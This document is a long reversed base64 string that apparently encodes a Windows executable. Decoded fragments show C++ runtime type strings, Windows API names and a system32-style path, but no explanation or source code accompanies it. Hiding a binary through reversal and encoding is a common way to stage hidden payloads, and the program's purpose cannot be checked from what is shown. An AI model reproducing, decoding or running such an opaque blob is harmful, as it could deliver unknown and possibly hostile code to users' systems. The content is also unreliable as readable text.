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QRZAAAAAw///v/AAAAA8///TNAAAAA////+DAAAAAEA8jzQAwP7+///7PAAAAA////YDAAAAw///v/AAAAAABA88HAAAAA////+DAAAAw///PwAAAAA8///7PAAAAAQAgOWCBA6I5///v/AAAAA8///jNAAAAA////+DAAAAAEAgzlAAAAA8///7PAAAAA////MDAAAAw///v/AAAAAABA04DAAAAA////+DAAAAw///P1AAAAA8///7PAAAAAQAQM3BAAAAw///v/AAAAA8///TNAAAAA////+DAAAAAEA4iDAAAAA8///7PAAAAA////UDAAAAw///v/AAAAAABArkGAAAAA////+DAAAAw///P1AAAAA8///7PAAAAAQAQH9CAAAAw///v/AAAAA8///DMAAAAA////+DBAYEEAAAAA////+DBAYUDAAAAA////+DAAAAw///P2AAAAA8///7PEAYhgAAAAA8///7PEAYxcAAAAA8///7PAAAAA////YDAAAAw///v/QAQKrDAAAwAAAAAA/////DAAAAAEAAJJAAAAAABAUcLAAAADAAAAA8////PAAAAAQAAkIAAAAAAEAIIdQAggYBAAAIAEAIITAAAAAABAUUIAAAAAQAwEKBBATkz///v/AAAAA8///TNAAAAA////+DAAAAAEAER2AAAAA8///7PAAAAA////YDAAAAw///v/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAYFEAAwQwDAAlAGAAAAAAAAAAAAAAAAEAEIoAAAAABAAAAw/////AAAAAAAAAAAEAAJkAAAAAABABiLEAEIsAAAABAAAAAAAAAAAQAQggCBAQCJAAAAAAAAAAAAAAAAEAEIYQAAkkAAAAAAAAAAAAAAAAAAAAAAEAEIRQAQgwBAAAEAAAAAAAAAAAABABCGAAAAQAAAAA8////PAAAAAAAAAAABAQSCEAEIDAAAAABAAAAw/////AAAAAAAAAEAEAAJCAAAAAABABSEEAEIKQAQgcAAAAIAAAAAAAAAAAABAByAEAAJCAAAAAAAAAAAAAAAAAAAADABABCOEAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAA4WZw9GAlhXZuQWbjxlMz0WZ0NXezx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